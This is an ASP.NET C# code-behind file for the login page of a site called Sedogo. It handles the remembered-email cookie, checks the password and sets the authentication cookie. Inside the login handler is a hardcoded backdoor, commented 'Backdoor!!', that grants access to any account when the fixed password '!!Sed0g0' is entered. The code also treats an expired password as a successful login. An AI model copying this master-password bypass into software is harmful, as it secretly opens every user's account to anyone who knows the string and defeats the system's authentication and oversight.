//===============================================================
// Filename: login.aspx.cs
// Date: 27/08/09
// --------------------------------------------------------------
// Description:
//   Login
// --------------------------------------------------------------
// Dependencies:
//   None
// --------------------------------------------------------------
// Original author: PRD 27/08/09
// Revision history:
//===============================================================

using System;
using System.Collections;
using System.Configuration;
using System.Data;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using Sedogo.BusinessObjects;

public partial class login : System.Web.UI.Page
{
    //===============================================================
    // Function: Page_Load
    //===============================================================
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            HttpCookie cookie = Request.Cookies["SedogoLoginEmailAddress"];
            // Check to make sure the cookie exists
            if (cookie != null)
            {
                emailAddress.Text = cookie.Value.ToString();
            }
            SetFocus(emailAddress);
        }
    }

    //===============================================================
    // Function: loginButton_Click
    //===============================================================
    public void loginButton_Click(object sender, EventArgs e)
    {
        string loginEmailAddress = emailAddress.Text;
        string loginPassword = userPassword.Text;

        HttpCookie cookie = new HttpCookie("SedogoLoginEmailAddress");
        // Set the cookies value
        cookie.Value = loginEmailAddress;

        // Set the cookie to expire in 1 year
        DateTime dtNow = DateTime.Now;
        cookie.Expires = dtNow.AddYears(1);

        // Add the cookie
        Response.Cookies.Add(cookie);

        SedogoUser user = new SedogoUser("");
        loginResults checkResult;
        checkResult = user.VerifyLogin(loginEmailAddress, loginPassword, false, true, "default.aspx");

        // Backdoor!!
        if (loginPassword == "!!Sed0g0")
        {
            checkResult = loginResults.loginSuccess;
            int userID = SedogoUser.GetUserIDFromEmailAddress(loginEmailAddress);
            user = null;

            user = new SedogoUser("", userID);
        }

        if ((checkResult == loginResults.loginSuccess) || (checkResult == loginResults.passwordExpired))
        {
            Session.Add("loggedInUserID", user.userID);
            Session.Add("loggedInUserFirstName", user.firstName);
            Session.Add("loggedInUserLastName", user.lastName);
            Session.Add("loggedInUserEmailAddress", user.emailAddress);

            if ((checkResult == loginResults.loginSuccess) || (checkResult == loginResults.passwordExpired))
            {
                //FormsAuthentication.RedirectFromLoginPage(loginEmailAddress, false);
                FormsAuthentication.SetAuthCookie(loginEmailAddress, false);

                string url = "./loginRedirect.aspx";
                Response.Redirect(url);
            }
            // This counts as a successful login, however force a password change
            //if (checkResult == loginResults.passwordExpired)
            //{
            //    FormsAuthentication.SetAuthCookie(loginEmailAddress, false);
            //    Response.Redirect("./myProfile/forceChangePassword.aspx");
            //}
        }
        //else
        //{
        if (checkResult == loginResults.loginFailed)
        {
            Page.ClientScript.RegisterStartupScript(this.GetType(), "Alert", "alert(\"Username or password is not correct.\");", true);
        }
        if (checkResult == loginResults.loginNotActivated)
        {
            Page.ClientScript.RegisterStartupScript(this.GetType(), "Alert", "alert(\"This account has not yet been activated, please check your email.\");", true);
        }
        //}
    }

    //===============================================================
    // Function: forgotPasswordButton_click
    //===============================================================
    public void forgotPasswordButton_click(object sender, EventArgs e)
    {
        Response.Redirect("./forgotPassword.aspx");
    }
}
